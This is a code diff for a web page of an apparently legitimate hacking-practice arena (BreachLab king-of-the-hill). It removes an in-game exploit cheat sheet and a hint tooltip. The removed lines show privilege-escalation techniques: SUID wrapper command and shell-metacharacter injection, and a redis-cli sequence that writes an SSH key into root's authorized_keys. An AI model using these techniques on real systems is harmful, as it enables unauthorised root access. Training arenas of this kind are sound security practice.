@@ -562,7 +562,7 @@ export default async function KothPage({
               <span className="text-muted">·</span>
               <span
                 className="text-red-400/90 uppercase tracking-widest"
-                title="Mutating Arena (Drift Mode). Binaries are renamed and relocated each round, and the exploit signature (which env var / shell metachar works) drifts too. Read /etc/breachlab-drift in the arena for this round's scheme."
+                title="Mutating Arena — the rest is for you to find."
               >
                 🌀 drift: {drift.schemeLabel}
               </span>
@@ -620,55 +620,8 @@ export default async function KothPage({
               <code className="ml-1">
                 crown-claim koth{mySlot.slot} &lt;exploit&gt;
               </code>{" "}
-              to claim the throne.
+              to claim the throne. Enumerate. Don&apos;t paste.
             </p>
-
-            {/* Exploit cheat sheet — collapsible, native <details>, no JS */}
-            <details className="text-[12px] font-mono pt-1.5 border-t border-green/20 mt-2">
-              <summary className="cursor-pointer text-amber hover:text-amber/80 select-none py-1 tracking-wider">
-                ▸ exploit cheat sheet · open at your own risk
-              </summary>
-              <div className="space-y-3 pt-2 pb-1">
-                <div className="space-y-1">
-                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                    suid-python-wrapper · argv code injection
-                  </div>
-                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
-{`/usr/local/bin/phantom-python3 -c \\
-  'import os; os.system("crown-claim koth${mySlot.slot} suid-python-wrapper")'`}
-                  </pre>
-                </div>
-                <div className="space-y-1">
-                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                    suid-shell-injection · shell metachar through SUID wrapper
-                  </div>
-                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
-{`/usr/local/bin/system-checker \\
-  '127.0.0.1; crown-claim koth${mySlot.slot} suid-shell-injection'`}
-                  </pre>
-                </div>
-                <div className="space-y-1">
-                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                    redis-config-set-dir · write authorized_keys via redis-cli
-                  </div>
-                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto whitespace-pre">
-{`ssh-keygen -t ed25519 -f /tmp/k -N ''
-KEY=$(cat /tmp/k.pub)
-redis-cli <<EOF
-CONFIG SET dir /root/.ssh
-CONFIG SET dbfilename authorized_keys
-SET x "\\n\\n$KEY\\n\\n"
-SAVE
-EOF
-ssh -i /tmp/k -o StrictHostKeyChecking=no root@localhost \\
-  "crown-claim koth${mySlot.slot} redis-config-set-dir"`}
-                  </pre>
-                </div>
-                <p className="text-[10px] text-muted leading-snug pt-1">
-                  Paths rotate per round. <code>which</code> if a 404 hits.
-                </p>
-              </div>
-            </details>
           </div>
         ) : myKey ? (
           // Operator has a registered key but no slot in the current
